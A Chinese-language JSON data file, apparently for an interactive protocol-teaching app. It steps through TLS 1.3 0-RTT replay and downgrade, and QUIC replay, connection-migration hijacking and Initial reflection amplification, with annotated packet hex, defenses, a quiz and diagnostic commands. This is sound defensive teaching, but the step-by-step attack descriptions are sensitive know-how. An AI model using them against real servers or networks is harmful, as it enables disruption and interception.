emotePort 443 | Measure-Object | Select-Object Count","n":"每次重放都是一条新连接，连接数突增是重放的侧影","s":"《系统》PowerShell.md · Get-NetTCPConnection"},{"c":"Test-NetConnection example.com -Port 443 -InformationLevel Detailed","n":"先排除网络问题造成的重试，再判是否重放","s":"《系统》PowerShell.md · Test-NetConnection"}],"cmd":[{"c":"curl -v --tlsv1.3 --tls-max 1.3 https://example.com -o NUL","n":"先确认基础 1.3 通路；curl 的 0-RTT 还要显式开启","s":"补充（Windows 内置 curl）"},{"c":"netstat -ano | findstr :443","n":"同一 PID 短时间内反复建连，值得单独看一眼","s":"《系统》Windows CMD.md · netstat"}]}},{"name":"降级：把 supported_versions 从包里删掉","steps":[{"who":"中间人","to":"客户端","pkt":0,"bubble":"截获 ClientHello","evil":true,"hl":["legacy_version","supported_versions (0x002b)"],"vals":{"legacy_version":"0x0303","supported_versions (0x002b)":"0x0304（真实偏好）"},"say":"中间人的目标不是解密，而是让这次握手用不上 1.3。","sub":"版本偏好藏在扩展里，所以他要动扩展，不动 legacy_version。"},{"who":"中间人","to":"服务器","pkt":0,"bubble":"删扩展","evil":true,"hl":["extensions_length","supported_versions (0x002b)","key_share (0x0033)"],"vals":{"extensions_length":"减 7 字节（含该扩展）","supported_versions (0x002b)":"已删除","key_share (0x0033)":"一并删除"},"say":"把 supported_versions 与 key_share 一起删掉再转发：1.3 的证据全没了。","sub":"服务器找不到 1.3 标识，只能按 0x0303 当 1.2 处理。"},{"who":"服务器","to":"中间人","pkt":0,"bubble":"印上哨兵","hl":["Random","legacy_version"],"vals":{"Random":"末 8 字节 …44 4F 57 4E 47 52 44 01","legacy_version":"0x0303"},"say":"被迫协商到 1.2 时，服务器必须在 random 末 8 字节写入降级哨兵。","sub":"这是 RFC 8446 给客户端的报警器：DOWNGRD 加一个版本字节。"},{"who":"客户端","to":"服务器","pkt":1,"bubble":"若不检查","hl":["Random","cipher_suites"],"vals":{"Random":"哨兵被忽略","cipher_suites":"落到 1.2 的 CBC 套件"},"say":"客户端不查哨兵，就以为「服务器只是不支持 1.3」，握手照常成功。","sub":"接下来 BEAST、POODLE 这些 2014 年的问题全部复活。"}],"cmds":{"linux":[{"c":"openssl s_client -connect example.com:443 -tls1_3 -groups X25519","n":"1.3 独占握手；失败说明服务端或链路把 1.3 摘掉了","s":"补充（openssl 不在 vault）"},{"c":"sudo tcpdump -ni any -X 'tcp port 443 and tcp[((tcp[12]&0xf0)>>2)] = 0x16'","n":"-X 打十六进制：直接看 ClientHello 里 supported_versions 在不在","s":"补充（抓包必备）"},{"c":"nmap --script ssl-enum-ciphers -p 443 example.com","n":"服务端到底支不支持 1.3，比客户端日志更可信","s":"补充（nmap NSE 脚本）"}],"ps":[{"c":"[Net.ServicePointManager]::SecurityProtocol","n":"旧 .NET 默认不含 TLS1.3，配置错误会静默退到 1.2","s":"《系统》PowerShell.md · .NET 安全协议设置"},{"c":"Test-NetConnection example.com -Port 443 -InformationLevel Detailed","n":"先排除通路问题，再判定是不是降级","s":"《系统》PowerShell.md · Test-NetConnection"}],"cmd":[{"c":"curl -v --tlsv1.3 https://example.com -o NUL","n":"看输出里 SSL connection 用的是哪个版本","s":"补充（Windows 内置 curl）"},{"c":"netsh http show sslcert","n":"IIS 侧绑定与协议配置，降级常从服务端配置开始","s":"《系统》Windows CMD.md · netsh"}]}}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"同一场重放与同一场降级各重放一遍，两处各被掐一次","lead":"0-RTT 的风险无法在协议层消除，只能在业务层收窄；降级则是客户端一个检查就能挡住。","scenes":[{"name":"幂等白名单 + 票据去重，客户端查哨兵","steps":[{"who":"攻击者","to":"服务器","pkt":1,"bubble":"重放 0-RTT","evil":true,"hl":["early_data (0x002a)","pre_shared_key (0x0029)"],"vals":{"early_data (0x002a)":"原样重放","pre_shared_key (0x0029)":"同一票据"},"say":"重放照旧：同一张票据、同一段字节，一个都不改。","sub":"防护的思路是让这次重放找不到可执行的东西。"},{"who":"服务器","to":"—","pkt":1,"bubble":"白名单拒绝","hl":["early_data (0x002a)"],"vals":{"early_data (0x002a)":"只对 GET/HEAD 接受"},"say":"只对幂等请求接受 early data：POST /transfer 被拒，退回 1-RTT。","sub":"0-RTT 省的是延迟，不该拿它去换「可能重复扣款」。"},{"who":"服务器","to":"—","pkt":1,"bubble":"票据单次 + 去重","hl":["pre_shared_key (0x0029)","psk_key_exchange_modes (0x002d)"],"vals":{"pre_shared_key (0x0029)":"票据单次使用，用后作废","psk_key_exchange_modes (0x002d)":"只允许 psk_dhe_ke"},"say":"票据标记单次使用，再按请求指纹在共享存储里去重，跨节点也拦得住。","sub":"只允许 psk_dhe_ke：恢复时仍做 ECDHE，前向安全不丢。"},{"who":"中间人","to":"服务器","pkt":0,"bubble":"再剥扩展","evil":true,"hl":["supported_versions (0x002b)"],"vals":{"supported_versions (0x002b)":"删除"},"say":"降级再试一次：剥掉 supported_versions，让服务器回 1.2。","sub":"这次客户端会去看 ServerHello 的 random 末尾。"},{"who":"客户端","to":"服务器","pkt":0,"bubble":"abort","hl":["Random"],"vals":{"Random":"末 8 字节 = 44 4F 57 4E 47 52 44 01"},"say":"客户端发现哨兵立刻中止：我支持 1.3，却被降到了 1.2。","sub":"服务端再禁掉 1.2 的 CBC 与静态 RSA，降级才彻底没有收益。"}],"cmds":{"linux":[{"c":"openssl s_client -connect example.com:443 -tls1_3 -sess_in s.pem -early_data early.txt","n":"复核：非幂等请求应当被推迟到 1-RTT 之后","s":"补充（openssl 不在 vault）"},{"c":"openssl s_client -connect example.com:443 -tls1_2","n":"还能握到 1.2 说明降级通路仍开着：这是资产判断，不是漏洞","s":"补充（openssl 不在 vault）"},{"c":"sudo tcpdump -ni any 'tcp port 443 and tcp[((tcp[12]&0xf0)>>2)] = 0x17'","n":"0-RTT 记录外层也是 0x17，看时间点判断是否在握手中途就发了数据","s":"补充（抓包必备）"}],"ps":[{"c":"Get-NetTCPConnection -RemotePort 443 | Group-Object State","n":"按状态聚合：去重生效后不应出现大量短命连接","s":"《系统》PowerShell.md · Get-NetTCPConnection"},{"c":"Test-NetConnection example.com -Port 443 -InformationLevel Detailed","n":"防护后复测：正常访问不能受影响","s":"《系统》PowerShell.md · Test-NetConnection"}],"cmd":[{"c":"curl -v --tlsv1.3 https://example.com -o NUL","n":"收紧策略后复测握手版本，确认没有意外退化","s":"补充（Windows 内置 curl）"},{"c":"netstat -ano | findstr :443","n":"复核连接分布，确认没有异常重建","s":"《系统》Windows CMD.md · netstat"}]}}]}]}},{"proto":{"id":"quic","name":"QUIC","cn":"快速 UDP 互联网连接","en":"Quick UDP Internet Connections","layer":"transport","chapter":"第四章","extra":true,"oneLine":"在 UDP 上重建可靠传输并把 TLS 1.3 内置进来：连接 ID 取代四元组、首部保护隐藏包号、每条流独立重传。","sections":[{"h":"在 UDP 之上重建可靠性与加密","p":"QUIC 把 TCP 的丢失恢复、拥塞控制与 TLS 1.3 的握手合并进一个协议，全部跑在用户态。它自己实现包号（单调递增、不复用）、ACK 帧、重传与拥塞控制，因此不受内核实现与操作系统发布周期的约束——新算法可以随应用一起灰度发布。\n\n代价是它必须自己面对重排序、重复、路径 MTU 探测这些 TCP 已经解决过的问题，还要处理 UDP 被封禁时的回落。收益是传输握手与加密握手合并（1-RTT，恢复会话时 0-RTT），以及每个包都被 AEAD 认证——中间设备改一个 bit 就会被发现并丢弃。"},{"h":"连接 ID 取代四元组，才谈得上连接迁移","p":"TCP 用四元组（源 IP、源端口、目的 IP、目的端口）标识连接：手机从 Wi-Fi 切到蜂窝网，源地址一变四元组就变了，连接只能重建。QUIC 用连接 ID 标识连接，包里携带的是对端指定的 CID 而不是地址；地址变了，只要 CID 不变且路径验证通过，连接就继续。\n\nCID 还让 QUIC 能在 NAT 重绑定、多路径与负载均衡之间保持会话。反过来说，CID 成了新的身份凭证：谁能发出携带正确 CID 的包，谁就被当作连接的一端——这让路径验证（PATH_CHALLENGE/PATH_RESPONSE）成为必需而非可选。"},{"h":"首部保护：连包号都不给中间设备看","p":"QUIC 有两层保护：包保护（AEAD 加密载荷）与首部保护（掩盖首字节低位与包号）。发送方用密文采样出 16 字节，经 AES-ECB(hp_key) 得到掩码，把首字节低 4 位（短首部为低 5 位）与包号字节异或掉。旁观者因此看不到包号，也就无法做基于包号的重放判定或精确丢包统计。\n\n这层保护的目标是抗“协议僵化”：中间盒无法根据包号与标志位推断协议行为，也就难以形成固化的干预规则。局限同样明显——首字节高位（长/短首部、包类型）、版本号、CID 长度与长度字段仍然可见，流量分析依然能做。"},{"h":"多路复用消灭队头阻塞，代价是自己实现拥塞控制","p":"TCP 的一条连接只有一个字节流，前一个字节丢了后面所有数据都得等——这是传输层队头阻塞。QUIC 在一条连接里跑多条独立的流，每条流有自己的偏移与重传，某个流丢包只阻塞该流；流之间还有流量控制（MAX_DATA / MAX_STREAM_DATA）防止一条流吃满整条连接。\n\n代价是复杂度整体上移：拥塞控制、丢包检测、pacing、抗放大限制、路径验证都要在应用里实现，还要处理 UDP 被封禁与 NAT 打洞。它也让加密从可选项变成必选项——QUIC 没有明文模式，基于明文特征的检测手段随之失效，安全设备只能看元数据。"}],"packets":[{"title":"QUIC Initial 包（长首部，含 CRYPTO 帧承载 TLS 1.3 ClientHello）","note":"v1、8 字节 DCID/SCID、Token 长度 0、4 字节包号；载荷为 CRYPTO 帧（类型 0x06）加 8 字节 PADDING。首字节低位与包号在线上受首部保护掩码，此处展示的是去保护后的明文形态；真实客户端首个 Initial 还需填充至至少 1200 字节","hex":"c3 00 00 00 01 08 83 94 c8 f0 3e 51 0b 2a 08 1f 2a 3b 4c 5d 6e 7f 80 00 40 3a 00 00 00 00 06 00 2b 16 03 01 00 c6 01 00 00 c2 03 03 5f 3a 11 22 33 44 55 66 77 88 99 aa bb cc dd ee 01 23 45 67 89 ab cd ef fe dc ba 98 76 54 32 10 00 00 00 00 00 00 00 00","fields":[{"name":"Header Form + Fixed Bit + Type + Reserved + PN Len","cn":"首字节位域","off":0,"len":1,"bits":"bit0 首部形式=1(长首部) / bit1 固定位=1 / bit2-3 包类型 00=Initial / bit4-5 保留=00 / bit6-7 包号长度 11=4 字节","tone":"flag","desc":"0xc3 = 1100 0011。长首部用于 1-RTT 密钥就绪之前的所有包（Initial、0-RTT、Handshake、Retry）。低 4 位受首部保护，线上看到的值是掩码异或后的结果；去掉保护后保留位必须为 0，否则以 PROTOCOL_VIOLATION 终止连接。","sec":"固定位（0x40）是 QUIC 与其他 UDP 协议共存的关键：置 0 的包必须丢弃。保留位非零即视为攻击迹象——这是 RFC 9000 明确要求“先去完两层保护再判断”，以免被单层剥离诱导误判。"},{"name":"Version","cn":"版本","off":1,"len":4,"bits":"","tone":"version","desc":"0x00000001 即 QUIC v1。版本 0 保留给 Version Negotiation 包，其格式特殊（不含 Length 与包号）。","sec":"版本字段是版本降级攻击的着力点：中间人改写版本可触发 Version Negotiation，攻击者可据此把连接压到它更熟悉的旧版本（如 gQUIC）。"},{"name":"Destination Connection ID Length","cn":"目的连接 ID 长度","off":5,"len":1,"bits":"","tone":"len","desc":"0x08。v1 规定上限 20 字节，超过即丢包。客户端首个 Initial 的 DCID 是随机值（用于派生 Initial 密钥），之后由服务器指定。","sec":"长度上限 20 是刻意的：既够随机又限制首部放大。超长 DCID 曾被用于构造放大攻击（请求小、响应首部大）。"},{"name":"Destination Connection ID","cn":"目的连接 ID","off":6,"len":8,"bits":"","tone":"id","desc":"8 字节随机值，本例 83 94 c8 f0 3e 51 0b 2a。服务器用它索引连接；客户端首个包里的 DCID 没有语义，只作为派生 Initial 密钥的盐。","sec":"DCID 是路由与身份的双重凭证：负载均衡器按它选后端，端点按它找连接。可预测的 DCID 会让攻击者枚举连接，也会削弱首部保护所依赖的密钥独立性。"},{"name":"Source Connection ID Length","cn":"源连接 ID 长度","off":14,"len":1,"bits":"","tone":"len","desc":"0x08，与 DCID 长度独立，同样上限 20 字节。","sec":"长度可变使首部长度不固定，基于固定偏移的解析器会错位；这也是 QUIC 让中间盒难以做深度检测的设计之一。"},{"name":"Source Connection ID","cn":"源连接 ID","off":15,"len":8,"bits":"","tone":"id","desc":"8 字节，本例 1f 2a 3b 4c 5d 6e 7f 80。它告诉对端“以后发给我的包请用这个 ID”，对端在后续包中把它填进 DCID。","sec":"SCID 是端点自选的，可定期轮换以抗关联（linkability）。固定不变的 SCID 会让旁观者把同一客户端的多条连接串起来做流量分析。"},{"name":"Token Length","cn":"令牌长度（varint）","off":23,"len":1,"bits":"","tone":"len","desc":"0x00，表示没有令牌。客户端首个 Initial 为 0；收到 Retry 后重发的 Initial 会携带服务器给的地址验证令牌。服务器发出的 Initial 必须为 0，客户端收到非零值应丢弃。","sec":"令牌是地址验证的凭证：服务器只对能收回令牌的地址投入资源，从而抑制伪造源地址的放大。绕过方式是复用合法客户端拿到的令牌（令牌窃取/重放），因此令牌应绑定客户端地址并有寿命。"},{"name":"Length","cn":"长度（varint）","off":24,"len":2,"bits":"","tone":"len","desc":"0x40 0x3a → 值 58，等于包号（4 字节）加载荷（54 字节）。varint 的 2 位前缀 01 表示两字节编码，14 位有效值。","sec":"长度字段受首部保护之外的注意点是它决定包边界：长度与实际不符会导致帧解析越界或把后续包吞进本包。放大攻击中攻击者也会用超长 Length 迫使对端预分配缓冲。"},{"name":"Packet Number","cn":"包号","off":26,"len":4,"bits":"","tone":"seq","desc":"0x00000000，首个 Initial 的包号为 0。包号单调递增、不回退、不复用，是丢包检测与 ACK 的依据（QUIC 用显式包号，不像 TCP 用字节序号）。","sec":"包号受首部保护，旁观者看不到，因此无法做精确的重放判定或丢包统计。这也使“按包号去重”的抗重放只能在端点内完成。"},{"name":"Payload / CRYPTO Frame","cn":"载荷与 CRYPTO 帧","off":30,"len":54,"bits":"","tone":"payload","desc":"载荷是帧序列（本例先一个 CRYPTO 帧，再 8 字节 PADDING）。CRYPTO 帧格式：类型 0x06、偏移 varint 0、长度 varint 43（43 字节）、数据为 TLS ClientHello 的前 43 字节 —— 16 03 01 00 c6 01 00 00 c2 03 03，即记录头 5 字节 + 握手头 4 字节 + legacy_version 2 字节 + 32 字节随机数。整段载荷在线上被 Initial 密钥 AEAD 加密。","sec":"CRYPTO 帧把 TLS 握手搬进 QUIC，因此“传输握手”与“加密握手”合并。Initial 密钥由公开的 DCID 派生，所以 Initial 载荷对旁观者并非机密——SNI 仍可被读出，这是 QUIC 元数据泄露的主要来源。"}]},{"title":"QUIC 1-RTT 包（短首部 + 两个 STREAM 帧）","note":"1-RTT 密钥建立后切换到短首部：无版本、无包类型、CID 无长度字段；载荷中两个 STREAM 帧分别属于流 0 与流 4，演示单连接内的多路复用","hex":"41 e3 5b 1d 9a 77 04 c6 f2 01 2c 0a 00 05 68 65 6c 6c 6f 0a 04 05 77 6f 72 6c 64","fields":[{"name":"Header Form + Fixed Bit + Spin + Reserved + Key Phase + PN Len","cn":"短首部首字节位域","off":0,"len":1,"bits":"bit0 首部形式=0(短首部) / bit1 固定位=1 / bit2 延迟自旋位=0 / bit3-4 保留=00 / bit5 密钥相位=0 / bit6-7 包号长度 01=2 字节","tone":"flag","desc":"0x41 = 0100 0001。短首部没有版本、没有包类型、没有 CID 长度，只有一个由接收方指定、长度由上下文约定了的 DCID，因此最省字节。密钥相位位用于密钥更新（Key Update）时区分新旧密钥。","sec":"短首部刻意把可解析信息压到最少：中间设备既看不到包类型也看不到包号，只能看到 DCID 与长度。这让基于“包类型/序号”的检测与限速几乎失效。"},{"name":"Destination Connection ID","cn":"目的连接 ID（无长度字段）","off":1,"len":8,"bits":"","tone":"id","desc":"8 字节，本例 e3 5b 1d 9a 77 04 c6 f2。短首部不携带长度字段，接收方按本端为该连接分配的 CID 长度解析——长度是上下文，不是线上信息。","sec":"这正是连接迁移的机制：包只认 CID 不认地址，源地址变了照样能落到同一条连接上。反过来，谁能发出带正确 CID 的包，谁就被当成连接端点，因此 CID 必须不可预测、可轮换。"},{"name":"Packet Number","cn":"包号","off":9,"len":2,"bits":"","tone":"seq","desc":"0x012c = 300。1 到 4 字节可变长度，由首字节低 2 位指示。编码的是“相对于最大已确认包号的偏移”的截断值，接收方据此还原完整包号。","sec":"截断包号 + 首部保护共同隐藏了真实序号，使旁观者无法做重放检测；端点侧必须严格按最大包号窗口还原，还原错误会导致丢包或错误 ACK。"},{"name":"Frames","cn":"帧序列（多路复用）","off":11,"len":16,"bits":"","tone":"payload","desc":"两个 STREAM 帧：0x0a 表示“有 LEN、无 OFF、无 FIN”，随后是流 ID（varint 0 与 4）、长度（5）、数据（hello / world）。同一条连接里不同流的数据可以交错发送，这是 QUIC 消除传输层队头阻塞的机制。","sec":"流 ID 明文（在载荷解密后）可被用来区分业务；帧序列被 AEAD 完整保护，改一个 bit 即整包丢弃。多路复用也让“按流限速”成为可能，攻击者可开大量流做资源耗尽（流数上限是必须的防御）。"}]}],"attacks":[{"name":"0-RTT Data Replay","cn":"QUIC 0-RTT 数据重放","impact":"同一条 0-RTT 的 STREAM 帧被重复交付给应用，造成重复提交或重复扣款","steps":[{"who":"客户端 C","to":"服务器 S","label":"首次连接完成，S 在 CRYPTO 帧中下发 NewSessionTicket（含 max_early_data_size）","note":"票据与 early secret 被 C 缓存；early key 由 PSK 派生"},{"who":"攻击者 A（路径上被动观察）","to":"—","label":"记录 C 下次连接的 Initial（含 early_data 的 ClientHello）与随后的 0-RTT 包（长首部类型 0x01）","note":"0-RTT 包与 Initial 一样用长首部，但受 0-RTT 密钥保护；A 解不开内容，可整包保存"},{"who":"攻击者 A","to":"服务器 S","label":"重放该 0-RTT 包（可改源地址与端口，只要 DCID 与包号可用）","note":"S 用同一 PSK 派生同一 early key，AEAD 校验通过；协议层无抗重放机制"},{"who":"服务器 S","to":"应用","label":"把 STREAM 帧（stream_id=0, 载荷为 POST 表单）在握手完成前交付应用","note":"请求被执行；S 此时尚未验证客户端身份，也无法判断这是重放"},{"who":"攻击者 A","to":"服务器 S","label":"在票据寿命内重复重放；若部署多节点且去重状态不共享，各节点可各执行一次","note":"放大效果取决于业务幂等性与部署拓扑，而非流量大小"}],"defense":"服务端限制 0-RTT 只用于幂等请求，对票据做单次使用标记并跨节点共享请求指纹去重，缩短票据寿命。"},{"name":"Connection Migration Hijack","cn":"连接迁移劫持（路径验证缺失）","impact":"下行流量被引向攻击者或黑洞，形成中间人或长时间断流","steps":[{"who":"攻击者 A（被动观察）","to":"—","label":"抓取 C↔S 的 1-RTT 包，记下短首部中的 DCID（8 字节）与包号规律","note":"短首部只有 CID 没有地址语义，CID 就是连接的唯一身份"},{"who":"攻击者 A","to":"服务器 S","label":"从自己的地址发出携带该 DCID 的 1-RTT 包（源地址伪装成 C 的新地址）","note":"S 按 CID 找到连接，发现源地址变化，按迁移逻辑处理"},{"who":"服务器 S","to":"攻击者 A 的地址","label":"PATH_CHALLENGE（8 字节随机数据）","note":"若 S 未做路径验证就直接迁移，这一步缺失，攻击立即成功"},{"who":"攻击者 A","to":"服务器 S","label":"PATH_RESPONSE 回显同样的 8 字节","note":"A 能收到挑战并应答，路径验证通过，S 正式把发送路径切到新地址"},{"who":"服务器 S","to":"攻击者 A","label":"后续下行数据全部发往新路径，真正的 C 只能看到自己的包被拥塞/无响应","note":"C 的连接逐渐超时；A 处于路径中间，可选择性转发或直接黑洞"}],"defense":"强制路径验证（PATH_CHALLENGE/PATH_RESPONSE），并要求迁移由对端主动发起（disable_active_migration 可禁止被动迁移），同时轮换 CID 降低被观察复用的概率。"},{"name":"Initial Amplification","cn":"Initial 反射放大","impact":"伪造源地址的 Initial 让服务器把数倍流量打向受害者，且无需完成握手","steps":[{"who":"攻击者 A","to":"服务器 S:443","label":"Initial, 源 IP=受害者 V, DCID 随机, 载荷为合法格式的 CRYPTO 帧（ClientHello 片段）","note":"S 必须解密 Initial 才能判断内容；Initial 密钥由 DCID 公开派生，A 本地即可算出并构造合法包"},{"who":"服务器 S","to":"受害者 V（伪造源）","label":"Initial + Handshake，携带证书链与 CertificateVerify（可达数 KB）","note":"服务器响应远大于请求，且此时尚未验证源地址"},{"who":"服务器 S","to":"受害者 V","label":"在收到对端任何包之前，累计发送量被限制在收到量的 3 倍","note":"抗放大限制把单点放大比压在 3×，这是 QUIC 相对 DNS/Memcached 反射的关键差异"},{"who":"攻击者 A（僵尸网络）","to":"大量 QUIC 服务器","label":"同时向数千台服务器发同构 Initial，源 IP 全部填 V","note":"每台 3× 的放大在 V 处叠加，总量随服务器数量线性增长"},{"who":"受害者 V","to":"—","label":"入向带宽与连接状态表被占满，正常 QUIC/HTTP3 访问失败","note":"V 只看到各服务器的地址，无法区分这是攻击还是正常连接失败"}],"defense":"服务器严格执行 3× 抗放大限制并在地址验证前不发送证书链，必要时用 Retry 令牌先验证地址；网络侧仍需 BCP38 阻断伪造源。"}],"defenses":[{"name":"抗放大限制（3×）","how":"服务器在收到对端可验证的包之前，把累计发送字节数限制在累计接收字节数的 3 倍以内；超限即停止发送，等收到更多数据或地址验证通过后解除。","limit":"3× 仍是正的放大比，分布式聚合后总量依旧可观；且限制只在单连接维度生效，攻击者可用海量连接分摊；对已经通过地址验证的反射器（Retry 令牌被窃取）则完全失效。"},{"name":"路径验证 + 迁移策略","how":"迁移前必须完成 PATH_CHALLENGE/PATH_RESPONSE（8 字节随机数回显），并可通过 disable_active_migration 传输参数禁止对端被动迁移；CID 定期轮换以减少可被观察复用的标识。","limit":"被动观察者可以复制 CID 并代答挑战（能收到挑战说明路径可达），因此路径验证证明的是“可达”而非“同一实体”；NAT 重绑定与真实迁移在协议层无法区分，过严的策略会误伤移动网络。"},{"name":"首部保护","how":"用 AEAD 密文采样 16 字节，经 AES-ECB(hp_key) 生成掩码，异或掉首字节低位与包号字段，使旁观者无法读取包号与部分标志位。","limit":"只掩盖首字节低位与包号：版本、CID 长度、长度字段、包类型仍明文可见；且 Initial 密钥由 DCID 公开派生，Initial 包内的 SNI 对旁观者实质可见。"},{"name":"0-RTT 限制与票据管理","how":"服务端只对幂等请求开启 early data，票据短寿命、单次使用，并按请求指纹在共享存储中去重；max_early_data_size 按业务实际需要设置而非取上限。","limit":"跨节点去重需要共享状态与额外延迟；白名单误配会把写操作放行；票据过短则 0-RTT 命中率下降，优化收益消失。"},{"name":"全程 AEAD + 密钥分层","how":"Initial、Handshake、0-RTT、1-RTT 各自使用独立密钥，由 TLS 1.3 的 key schedule 分层派生；任何未被认证的修改都会导致整包丢弃，中间盒无法做透明改写。","limit":"加密使基于载荷的检测、缓存与压缩代理全部失效，安全运营失去可见性；同时 QUIC 依赖 UDP，凡封禁 UDP 的网络只能回落 TCP，防护策略需要两套。"}],"calcs":["checksum"],"quiz":[{"q":"QUIC 能实现连接迁移的根本原因是什么？","options":["因为它运行在 UDP 之上","因为连接身份由连接 ID 标识，而不是地址四元组","因为它支持 0-RTT"],"a":1,"why":"跑在 UDP 上只是前提（无需内核维护四元组状态）。真正的机制是连接 ID：包只携带 CID 不携带地址语义，源地址变化不影响连接归属，配合路径验证即可继续传输。"},{"q":"QUIC 的首部保护主要掩盖了哪些信息？","options":["整个连接 ID","首字节的低位（含包号长度）与包号字段","版本号与 CID 长度"],"a":1,"why":"首部保护用密文采样生成掩码，异或掉首字节低位与包号；版本号、CID 长度与 Length 字段仍在明文，因此流量分析仍可基于这些元数据进行。"},{"q":"QUIC 的抗放大限制把服务器在地址验证前的发送量限制为收到量的多少倍？","options":["1 倍","3 倍","10 倍"],"a":1,"why":"RFC 9000 规定地址验证前服务器发送不得超过接收的 3 倍，这把单点放大比压到很低，是 QUIC 相比 Memcached/DNS 反射更难被滥用的关键；但它不阻止分布式聚合。"}]},"script":{"id":"quic","notes":{"Header Form + Fixed Bit + Type + Reserved + PN Len":{"short":"一个字节定形态，低 4 位还被盖住","more":"0xc3 即长首部、固定位 1、类型 00（Initial）、保留位 00、包号长 4 字节。低 4 位受首部保护，线上看到的是掩码异或后的值；去保护后保留位必须为 0。","sec":"固定位置 0 的包必须丢弃，这是与其他 UDP 协议共存的关键；保留位非零即视为攻击迹象，但必须先剥完两层保护再判断。"},"Destination Connection ID":{"short":"连接的唯一身份，也是劫持入口","more":"首个 Initial 里是 8 字节随机值，只用作派生 Initial 密钥的盐；之后由服务器指定，客户端此后每个包都带着它。短首部不带长度字段，长度由接收方上下文决定。","sec":"包只认 CID 不认地址，所以源地址变了连接也断不了——这既是连接迁移的机制，也是迁移劫持的入口；CID 必须不可预测且定期轮换。"},"Token Length":{"short":"地址验证令牌，Retry 后才非零","more":"varint。客户端首个 Initial 为 0；收到 Retry 后重发的 Initial 会带服务器给的令牌。服务器发出的 Initial 必须为 0，客户端收到非零值应丢弃。","sec":"令牌让服务器只对「能收回令牌」的地址投资源，从源头压掉伪造源的放大；令牌需绑定客户端地址并设寿命，否则可被窃取复用。"},"Frames":{"short":"载荷里的帧序列，多流就在这里交错","more":"载荷是帧序列，本例两个 STREAM 帧：0x0a 表示有 LEN、无 OFF、无 FIN，随后是流 ID、长度与数据。不同流的数据可在同一包里交错发送，各自独立重传。","sec":"帧被 AEAD 完整保护，改一个 bit 整包丢弃；但流 ID 解密后明文可辨业务，攻击者也能开大量流做资源耗尽，所以流数上限是必需防御。"}},"acts":[{"key":"normal","no":"第 1 幕","title":"它正常怎么工作","desc":"UDP 之上的可靠传输加内置 TLS 1.3：一个包既建连也握手","lead":"注意两件事：第一个包里就装着 TLS 的 ClientHello；之后所有路由都靠连接 ID，而不是地址。","scenes":[{"name":"Initial 建连，短首部传数据，地址变了也能继续","steps":[{"who":"客户端","to":"服务器","pkt":0,"bubble":"Initial","hl":["Version","Destination Connection ID","Payload / CRYPTO Frame"],"vals":{"Version":"0x00000001（QUIC v1）","Destination Connection ID":"8 字节随机，当作 Initial 密钥的盐","Payload / CRYPTO Frame":"CRYPTO 帧里就是 TLS ClientHello"},"say":"第一个 UDP 包里直接装 TLS ClientHello：传输握手与加密握手合成一次。","sub":"Initial 密钥由公开的 DCID 派生，所以这一段旁观者其实读得懂。"},{"who":"服务器","to":"客户端","pkt":0,"bubble":"Initial + Handshake","hl":["Source Connection ID","Token Length","Length"],"vals":{"Source Connection ID":"服务器指定的 CID","Token Length":"0x00（地址还没验证）","Length":"0x403a = 58（服务器首包通常更大）"},"say":"服务器指定 CID 并回自己的 Initial；地址未验证前，发送量不得超过收到的 3 倍。","sub":"3× 是单点放大的天花板，也是它比 DNS、Memcached 难被滥用的原因。"},{"who":"客户端","to":"服务器","pkt":1,"bubble":"1-RTT","hl":["Destination Connection ID","Packet Number","Frames"],"vals":{"Destination Connection ID":"8 字节，此后路由全靠它","Packet Number":"0x012c（单调递增、不复用）","Frames":"STREAM(id=0) 与 STREAM(id=4)"},"say":"握手完成后切成短首部：没有版本、没有包类型，只剩 CID 与包号。","sub":"包号显式递增且不复用，是丢包检测与 ACK 的依据，比字节序号简单。"},{"who":"客户端","to":"—","pkt":0,"bubble":"首部保护","hl":["Header Form + Fixed Bit + Type + Reserved + PN Len","Packet Number"],"vals":{"Header Form + Fixed Bit + Type + Reserved + PN Len":"低位被掩码异或","Packet Number":"被掩码，旁观者读不到"},"say":"首部保护把首字节低位与包号一起异或掉：连序号都不给中间设备看。","sub":"目的不是保密而是抗僵化——中间盒无法形成基于包号的固化规则。"},{"who":"客户端","to":"服务器","pkt":1,"bubble":"连接迁移","hl":["Destination Connection ID","Frames"],"vals":{"Destination Connection ID":"还是这 8 字节","Frames":"PATH_CHALLENGE / PATH_RESPONSE 验新路径"},"say":"从 Wi-Fi 切到蜂窝：源地址变了，只要 CID 不变，连接照旧继续。","sub":"身份从四元组解耦到 CID，这是连接迁移成立的根本原因。"},{"who":"服务器","to":"客户端","pkt":1,"bubble":"多路复用","hl":["Frames"],"vals":{"Frames":"STREAM(0) 与 STREAM(4) 交错发送"},"say":"一条连接跑多条流：某条流丢包只阻塞它自己，没有跨流队头阻塞。","sub":"代价是拥塞控制、pacing、丢包检测全搬到用户态自己实现。"}],"cmds":{"linux":[{"c":"curl --http3 -sv https://cloudflare-quic.com -o /dev/null","n":"--http3 走 QUIC；需 curl ≥7.66 且编译了 ngtcp2 或 quiche 后端","s":"补充（curl 的 HTTP/3 需单独编译，vault 未收录）"},{"c":"sudo tcpdump -ni any 'udp port 443'","n":"QUIC 全在 UDP 443；长首部首字节高位为 1，短首部为 0","s":"补充（抓包必备）"},{"c":"ss -uanp | grep ':443'","n":"本机 UDP 443 端点与进程，确认走的是 UDP 而不是 TCP","s":"《系统》Linux.md · ss"}],"ps":[{"c":"Test-NetConnection cloudflare-quic.com -Port 443 -InformationLevel Detailed","n":"注意这是 TCP 探测：通了也不代表 UDP 443 能过","s":"《系统》PowerShell.md · Test-NetConnection"},{"c":"Get-NetUDPEndpoint -LocalPort 443","n":"本机 443 上的 UDP 端点，QUIC 客户端会占一个短暂端口","s":"《系统》PowerShell.md · 网络管理 Cmdlet"}],"cmd":[{"c":"curl --http3 -v https://cloudflare-quic.com -o NUL","n":"同 Linux 侧；不支持时会直接报 --http3 未知选项","s":"补充（Windows 内置 curl 通常不含 HTTP/3 后端）"},{"c":"netstat -ano -p UDP | findstr :443","n":"看 443 上有没有 UDP 流量，区分 QUIC 与普通 HTTPS","s":"《系统》Windows CMD.md · netstat"}]}}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"0-RTT 可以被重放；连接 ID 既认连接，也认拿着它的人","lead":"这一章的两个攻击都不需要密钥：一个照抄字节，一个照抄 CID。","scenes":[{"name":"0-RTT 重放：同一段字节，执行两次","steps":[{"who":"服务器","to":"客户端","pkt":0,"bubble":"NewSessionTicket","hl":["Payload / CRYPTO Frame"],"vals":{"Payload / CRYPTO Frame":"CRYPTO 帧里带 